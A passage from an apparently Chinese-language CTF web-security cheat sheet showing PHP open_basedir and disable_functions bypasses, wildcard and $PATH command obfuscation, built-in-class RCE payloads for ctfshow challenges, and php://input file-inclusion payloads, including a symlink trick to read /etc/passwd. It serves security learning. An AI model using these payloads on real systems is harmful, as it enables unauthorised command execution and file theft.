+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;&#x27;..&#x27;&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>读取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=chdir(&#x27;/tmp&#x27;);mkdir(&#x27;lethe&#x27;);chdir(&#x27;lethe&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(ini_get(&#x27;open_basedir&#x27;));var_dump(file_get_contents(文件名));</span><br></pre></td></tr></table></figure>
+
+<h4 id="②利用glob-伪协议绕过"><a href="#②利用glob-伪协议绕过" class="headerlink" title="②利用glob://伪协议绕过"></a>②利用glob://伪协议绕过</h4><p><strong>PS:此方法只能列出根目录下的文件</strong></p>
+<p>glob:// — 查找匹配的文件路径模式。</p>
+<p>glob://是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，其用法示例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="line">// 并打印文件名和文件尺寸</span><br><span class="line">$it = new DirectoryIterator(&quot;glob://ext/spl/examples/*.php&quot;);</span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line">    printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过原理：只是用glob://伪协议是无法直接绕过的，它需要结合其他函数组合利用，主要有以下两种利用方式，局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容</p>
+<p>Ⅰ.<strong>DirectoryIterator+glob://</strong></p>
+<p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。<br>DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入glob:///*即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件</p>
+<p>例子：ctfshow-web入门72</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>flag0.txt</code></p>
+<p>Ⅱ.<strong>opendir()+readdir()+glob://</strong></p>
+<p>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目</p>
+<p>这里结合两个函数来列举根目录中的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">if ( $b = opendir(&quot;glob:///*&quot;) ) &#123;</span><br><span class="line">    while ( ($file = readdir($b)) !== false ) &#123;</span><br><span class="line">        echo $file.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>效果和①是一样的，只能绕过 open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件</p>
+<p>例子：ctfshow-web入门72</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php if($b = opendir(&quot;glob:///*&quot;))&#123;while(($file = readir($b))!==false)&#123;echo $file.&quot; &quot;;&#125;closedir($b);exit(0);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>flag0.txt</code></p>
+<h4 id="③利用syslink-函数绕过"><a href="#③利用syslink-函数绕过" class="headerlink" title="③利用syslink()函数绕过"></a>③利用syslink()函数绕过</h4><p><img src="https://img-blog.csdnimg.cn/59fbe7678cfa457da82f5f9607efbe96.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身<br>绕过方式：</p>
+<p>原理是创建一个链接文件flag用相对路径指向A/B/C/D，再创建一个链接文件exp指向flag/…/…/…/…/etc/passwd，其实就是指向了A/B/C/D/…/…/…/…/etc/passwd，也就是/etc/passwd。这时候删除aaa文件再创建aaa目录但是exp还是指向了aaa也就是A/B/C/D/…/…/…/…/etc/passwd，就进入了路径/etc/passwd</p>
+<p><strong>PS:payload构造的注意点就是：要读的文件需要往前跨多少路径，就得创建多少层的子目录，然后输入多少个…/来设置目标文件。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&quot;A&quot;);</span><br><span class="line">chdir(&quot;A&quot;);</span><br><span class="line">mkdir(&quot;B&quot;);</span><br><span class="line">chdir(&quot;B&quot;);</span><br><span class="line">mkdir(&quot;C&quot;);</span><br><span class="line">chdir(&quot;C&quot;);</span><br><span class="line">mkdir(&quot;D&quot;);</span><br><span class="line">chdir(&quot;D&quot;);</span><br><span class="line">chdir(&quot;..&quot;);</span><br><span class="line">chdir(&quot;..&quot;);</span><br><span class="line">chdir(&quot;..&quot;);</span><br><span class="line">chdir(&quot;..&quot;);</span><br><span class="line">symlink(&quot;A/B/C/D&quot;,&quot;flag&quot;);</span><br><span class="line">symlink(&quot;flag/../../../../etc/passwd&quot;,&quot;exp&quot;);</span><br><span class="line">unlink(&quot;flag&quot;);</span><br><span class="line">mkdir(&quot;flag&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="13-disable-function绕过"><a href="#13-disable-function绕过" class="headerlink" title="13.disable_function绕过"></a>13.disable_function绕过</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41107295/article/details/98462891?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162695102916780274170872%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162695102916780274170872&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-98462891.first_rank_v2_pc_rank_v29&utm_term=PHP%E7%BB%95%E8%BF%87disable_function%E9%99%90%E5%88%B6&spm=1018.2226.3001.4187">PHP绕过disable_function限制</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109171760">PHP绕过disable_function限制</a></p>
+<h3 id="14-通配符-绝对路径调用命令"><a href="#14-通配符-绝对路径调用命令" class="headerlink" title="14.通配符+绝对路径调用命令"></a>14.通配符+绝对路径调用命令</h3><p>原理：<br>因为默认配置了环境变量使用才可以直接使用cat 等命令，但是可以使用路径调用命令如 /bin/cat，再加上通配符就能绕过很多限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64 flag.php</span><br><span class="line">/bin/base64 flag.php</span><br><span class="line">/???/???e64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/500937061b8c40be87bc1fc5fb8211ab.png" alt="在这里插入图片描述"></p>
+<p>（ZmxhZ3tJX0FNX0FfRkxBR30= 为flag{I_AM_A_FLAG}的十六进制编码）</p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要过滤了字母，分号，&lt;&gt;，使用通配符代替字母，目录调用命令即可。</p>
+<p>payload1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????64 ????.???  #/bin/base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/70d9ad4dfdd24c84a1fdc6223234c17d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/???/????2 ????.??? #/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>然后下载flag.php.bz2</p>
+<p><img src="https://img-blog.csdnimg.cn/813c2fae282a4454b7a8c94d8732f9cb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="15-grep绕过关键词过滤"><a href="#15-grep绕过关键词过滤" class="headerlink" title="15.grep绕过关键词过滤"></a>15.grep绕过关键词过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep &#123; f???????</span><br><span class="line">相当于</span><br><span class="line">grep &#123; flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/e932ebd2f5034290bbe5ebb613108f0e.png" alt="在这里插入图片描述"></p>
+<h3 id="16-使用-构造数字"><a href="#16-使用-构造数字" class="headerlink" title="16.使用~$()构造数字"></a>16.使用~$()构造数字</h3><p>当数字被过滤时，我们可以使用shell语句~$()来构建我们想要的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;_&#125;=&quot;&quot;  #$&#123;_&#125;会输出上一次的执行结果</span><br><span class="line">$(($&#123;_&#125;))=0</span><br><span class="line">$((~$(($&#123;_&#125;))))=-1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/27be47046a8740e4a2fee313b282f927.png" alt="在这里插入图片描述"></p>
+<p>例子：构造一个数字5</p>
+<p>先输出六个-1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/3eba9ef6dbac4214810d9d8c8012e557.png" alt="在这里插入图片描述"></p>
+<p>再取反</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/aef7c8a598f54ce584aea4a1eacd5737.png" alt="在这里插入图片描述"></p>
+<p>最后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/53f1158f2c034ef9ae26551d537284d5.png" alt="在这里插入图片描述"></p>
+<p>得到数字5</p>
+<h3 id="17-绕过disable-functions"><a href="#17-绕过disable-functions" class="headerlink" title="17.绕过disable_functions"></a>17.绕过disable_functions</h3><p>当getshell后却无法执行系统命令<br><img src="https://img-blog.csdnimg.cn/dcf0a326fa8d49ab887f179e05ef712c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>因为可能被设置了disable_functions函数，我们可以通过uaf脚本来绕过这个函数。</p>
+<p>这里涉及到很多pwn的知识，本人主要学习web，对pwn的认识比较浅薄，在这里推荐几篇优秀的文章供大家参考。</p>
+<p>推荐文章：</p>
+<p><a target="_blank" rel="noopener" href="http://www.52bug.cn/hkjs/6888.html">绕过Disable Fucntons</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109171760">PHP绕过disable_function限制</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41071646/article/details/89678625">UAF的学习 Wiki</a></p>
+<h3 id="18-利用php内置类rce"><a href="#18-利用php内置类rce" class="headerlink" title="18.利用php内置类rce"></a>18.利用php内置类rce</h3><h5 id="①利用-FilesystemIterator-获取指定目录下的所有文件"><a href="#①利用-FilesystemIterator-获取指定目录下的所有文件" class="headerlink" title="①利用 FilesystemIterator 获取指定目录下的所有文件"></a>①利用 FilesystemIterator 获取指定目录下的所有文件</h5><p>例子：ctfshow-web110</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/8e238658e5f041c0a729e01c74741bba.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="②使用PHP的反射类ReflectionClass、ReflectionMethod和PHP异常处理-Exception来rce"><a href="#②使用PHP的反射类ReflectionClass、ReflectionMethod和PHP异常处理-Exception来rce" class="headerlink" title="②使用PHP的反射类ReflectionClass、ReflectionMethod和PHP异常处理 Exception来rce"></a>②使用PHP的反射类ReflectionClass、ReflectionMethod和PHP异常处理 Exception来rce</h5><p>例子：</p>
+<p>ctfshow-web109</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reorting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;cat *&#x27;) </span><br><span class="line">?v1=Reflectionclass&amp;v2=system(&#x27;cat *&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/1698b43d915d4ba0ac7cd9763f69b494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="19-PATH环境变量绕过"><a href="#19-PATH环境变量绕过" class="headerlink" title="19.$PATH环境变量绕过"></a>19.$PATH环境变量绕过</h3><p><img src="https://img-blog.csdnimg.cn/ccecc749723e4fa99fde0f65f465687b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>①大写字母数字和{}绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/435e58195d5c45fbb1d6345a76be4273.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125; 1</span><br><span class="line">相当于</span><br><span class="line">ls 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/da4e5f91d77e4902a1ff1f99733f3ce0.png" alt="在这里插入图片描述"></p>
+<p>②大写字母和{}绕过</p>
+<p>当不允许我们使用数字时，我们可以用环境变量长度来代替数字<br><img src="https://img-blog.csdnimg.cn/75c63bd8cd4e4c37a60b1652b8c8c577.png" alt="在这里插入图片描述"><br><strong>PS:不同系统的环境可能不同，所以环境变量的长度可能不同。</strong></p>
+<p>我们可以用下列语句搜寻我们预期长度的环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `env`; do echo -n &quot;$&#123;i%=*&#125; lenth is &quot;;echo $&#123;i#*=&#125;|awk &#x27;&#123;print length($0)&#125;&#x27;; done |grep 5</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/ad0d1d7c91f8494dae81d0778716a04e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `env`; do echo -n &quot;$&#123;i%=*&#125; lenth is &quot;;echo $&#123;i#*=&#125;|awk &#x27;&#123;print length($0)&#125;&#x27;; done |grep 11</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/c917c42978c14dcaad4fdab28dca38b9.png" alt="在这里插入图片描述"></p>
+<p>所以构建语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:$&#123;#XDG_MENU_PREFIX&#125;:1&#125;$&#123;PATH:$&#123;#XDG_RUNTIME_DIR&#125;:1&#125; 1</span><br><span class="line">相当于</span><br><span class="line">ls 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2bfce5f2214e472a8715a60c93500d9d.png"></p>
+<h2 id="四、文件包含"><a href="#四、文件包含" class="headerlink" title="四、文件包含"></a>四、文件包含</h2><p><strong>伪协议文件包含（伪协议后必须是文件绝对路径）</strong></p>
+<p>file:// 访问本地文件系统<br>http:// 访问 HTTPs 网址<br>ftp:// 访问 ftp URL<br>php:// 访问输入输出流<br>zlib:// 压缩流<br>data:// 数据<br>ssh2:// security shell2<br>expect:// 处理交互式的流<br>glob:// 查找匹配的文件路径</p>
+<p><strong>包含函数</strong><br><img src="https://img-blog.csdnimg.cn/65ab49ee2ad84b448893318ca47cbffe.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="①php-input"><a href="#①php-input" class="headerlink" title="①php://input"></a>①php://input</h3><p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 <code>always_populate_raw_post_data</code> 潜在需要更少的内存。 <code>enctype=&quot;multipart/form-data&quot;</code> 的时候 php://input 是无效的。</p>
+<p><img src="https://img-blog.csdnimg.cn/a061439822084dcbb53d219ce4dde52e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://input</span><br><span class="line"></span><br><span class="line">&lt;?php system(“ls /”)?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/34c0f9cb710e4205891bd553eda536a4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/0bff0338133647d49c440f19e5b9802f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="②-php-filter"><a href="#②-php-filter" class="headerlink" title="②.php://filter"></a>②.php://filter</h3><p>php://filter 是一种元封装器， 设计用于数据流打开时的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
